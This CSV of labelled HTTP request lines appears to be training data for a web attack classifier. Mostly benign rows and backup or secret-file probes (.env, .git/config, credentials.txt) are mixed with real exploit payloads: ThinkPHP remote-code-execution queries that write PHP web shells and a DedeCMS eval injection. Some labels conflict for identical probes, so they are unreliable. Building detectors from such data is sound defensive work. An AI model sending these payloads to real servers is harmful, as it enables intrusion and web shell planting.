text,label
METHOD=HEAD PATH=/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/backup.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/index.php QUERY=s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/backup/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/backups/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/bak/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/website.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/credentials.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
"METHOD=GET PATH=/uploads/dede/sys_verifies.php QUERY=action=getfiles&refiles[0]=123&refiles[1]=\"";eval($_POST[ysy]);die();// PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/old/directory.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=/ PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/back/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/Datasets Description/PE_malware/VirusShare.html QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/assets/plugins/fileupload/server/php/index.php QUERY=file=tf2rghf.jpg PROTOCOL=HTTP/1.1,command_exec
METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/application.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/honeypot/bsidesdfw - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/public_html.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/website.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/.git/config QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/back/www.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec
METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign
"METHOD=GET PATH=/ QUERY=s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> PROTOCOL=HTTP/1.1",command_exec
METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=HEAD PATH=/old/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backup/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/back/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe
METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hutter&password=datilado&nombre=Lebera&apellidos=Pujadas+Serch&email=titre%40hispadis.tc&dni=43931807J&direccion=Juan+Ramon+Jimenez%2C+17%2C+&ciudad=Jimena+de+la+Frontera&cp=37338&provincia=Sevilla&ntc=1381126471579626&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=azhar&password=mohadA&nombre=Adelaida&apellidos=Tomasevich&email=cunthor%40mercadozoom.me&dni=87747494X&direccion=Calle+Alcala+Galiano%2C+144+10H&ciudad=Sunbilla&cp=17772&provincia=Lleida&ntc=6199550568888284&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=vonderwe&password=7n3a48&nombre=Katerina&apellidos=Pellis+Reig&email=celentano_daufil%40nikemujeres.hk&dni=80940508N&direccion=Avinguda+Can+Fontanals+16+7F&ciudad=Seva&cp=19118&provincia=Valencia&ntc=1183543291273675&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=peiling&password=VaS6&nombre=Gismundo&apellidos=Canas+Anglaril&email=moreland%40magichobby.km&dni=76543761Z&direccion=C%2F+Pau+Gargallo%2C+27+5G&ciudad=Capolat&cp=22135&provincia=Zaragoza&ntc=6142248987618034&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=burke&password=pellijero&nombre=Sofiel&apellidos=Pijuan&email=dhein7%40blueberryminiloaf.com.pe&dni=50806754F&direccion=Avenida+De+La+Pasion%2C+27%2C+8%3FF&ciudad=Mazarambroz&cp=16336&provincia=Madrid&ntc=9476466081196673&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hunter&password=90m1r236a4&nombre=Gertrudis&apellidos=Cigala&email=muser%40global-services.dm&dni=33890004X&direccion=C%2F+Veronica+198+&ciudad=Villamayor&cp=37460&provincia=Navarra&ntc=3976120192503130&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=wilcox&password=c2n87n&nombre=Yamari&apellidos=Borbonio+Antonioli&email=stinehart_rigas%40sierradealcaraz.pr&dni=76322755S&direccion=Lince%2C+36+12%3FG&ciudad=Mues&cp=08460&provincia=Zaragoza&ntc=0968269656631790&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=adela&password=eNvasAdor&nombre=Belino&apellidos=Mayans&email=jennifer%40intelethernet.cz&dni=85492231N&direccion=Glorieta+De+Julio+Robles%2C+47%2C+&ciudad=Ojacastro&cp=46729&provincia=Palencia&ntc=7701825811955975&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=ruppert2&password=65rti3ismo&nombre=Alfonsina&apellidos=Cimino+Chac%F3n&email=nordstrom-driver%40inventoscaseros.pr&dni=65511934E&direccion=C%2F+Doctor+Rodriguez+De+La+Fuente%2C+S%2FN+&ciudad=Alqu%E9zar&cp=29493&provincia=Santa+Cruz+de+Tenerife&ntc=7812097176228751&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=jordanna3&password=desembarazadamente&nombre=Yamal&apellidos=Llebot+Sayago&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=59201826X&direccion=Sierra+Alta+138+&ciudad=Iruelos&cp=19174&provincia=M%E1laga&ntc=6515740156899202&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=marykay&password=regoci6ad3r&nombre=Leonor&apellidos=Rea+Campmajor&email=close%40indagacion.mm&dni=09069178W&direccion=Calle+Benito+Perez+Galdos+139+&ciudad=Azut%E1n&cp=07195&provincia=Zaragoza&ntc=4288416752573801&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=dario&password=sep3&nombre=C%E1tulo&apellidos=Name+Baralt&email=michelot%40manzanilladevillafafila.mn&dni=13454128W&direccion=Virgen+De+Minerva%2C+48%2C+10%3FE&ciudad=Campot%E9jar&cp=31480&provincia=%C1vila&ntc=8246951041406295&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yea-ping&password=cedacero&nombre=Leticia&apellidos=Santanton&email=bernstein%40beltoan.com.ck&dni=02401008S&direccion=Jardines+De+Capitan+Ramos%2C+138%2C+5D&ciudad=Vall-llobrega&cp=05280&provincia=Palencia&ntc=9922252856683961&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=sheehan&password=m%3Fi&nombre=Sharon&apellidos=Balac+Ginet&email=gotell%40muevemiweb.wf&dni=06136230Z&direccion=C%2F+Comandante+Roman%2C+S%2FN+&ciudad=Navas+del+Rey&cp=08696&provincia=Salamanca&ntc=0788909004705438&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yerneni&password=%21afi2mamiento&nombre=Paulino&apellidos=Marc%E9+Chimal&email=thorntveidt%40cincocolores.museum&dni=81318789N&direccion=Sur+155%2C+8-F&ciudad=Od%E8n&cp=46890&provincia=Girona&ntc=1835703136482162&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=efdal&password=2lBOrad6&nombre=Ver%F3nica&apellidos=Carpio&email=sergeev%40manzanilladevillafafila.mg&dni=63838683K&direccion=C%2F+Fuente+Milanos+48%2C+5-D&ciudad=Salmer%F3n&cp=33394&provincia=Burgos&ntc=6234916143793622&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=maury&password=sos4ec6oso&nombre=Secundina&apellidos=Domene+Chimal&email=iranzo%40gopersonaltrainers.ug&dni=64695200H&direccion=C%2F+Gaztela+49+9%3FG&ciudad=A%F1e&cp=13532&provincia=Le%F3n&ntc=2068642813627921&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=emlynne&password=SiSteMatizaci%F3n&nombre=Isabella&apellidos=Cabot+Brot%F3&email=oland5%40schnaps.com.by&dni=51920905S&direccion=Camino+Ronda%2C+72%2C+&ciudad=Total%E1n&cp=28473&provincia=Valladolid&ntc=5686265534103266&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=petri&password=en%2Bcandelar&nombre=Ciriaco&apellidos=Farge+Ferrara&email=ester%40fighting-machines.wf&dni=96138987E&direccion=C%2F+Nicaragua+48%2C+&ciudad=Nov%E9s&cp=08795&provincia=Ja%E9n&ntc=7732206170893125&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mirenda&password=d3v3c4%F3n&nombre=Cruz&apellidos=Munsech+Larramendi&email=amer_dierkes%40ajuntamentdebarcelona20.gm&dni=31996824Y&direccion=Plumbago+39+&ciudad=Vilavella%2C+la&cp=08280&provincia=Navarra&ntc=6005492859075787&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=soroker&password=di7377dor&nombre=Sadia&apellidos=Kisines+Selvas&email=unger-waldridge%40nuestrasantacruz.dd&dni=87425645T&direccion=Plza.+Maestro+191%2C+&ciudad=Fuentearmegil&cp=45180&provincia=Barcelona&ntc=2717952590420573&B1=Registrar PROTOCOL=HTTP/1.1,benign
METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=carlean1&password=sobReproducci%F3n&nombre=Raquel&apellidos=Resalt&email=dina%40cementoscalibra.py&dni=59007256C&direccion=Calle+Subride+Bajo%2C+70+&ciudad=Valenzuela+de+Calatrava&cp=34820&provincia=Salamanca&ntc=3315223857968488&B1=Registrar PROTOCOL=HTTP/1.1,benign
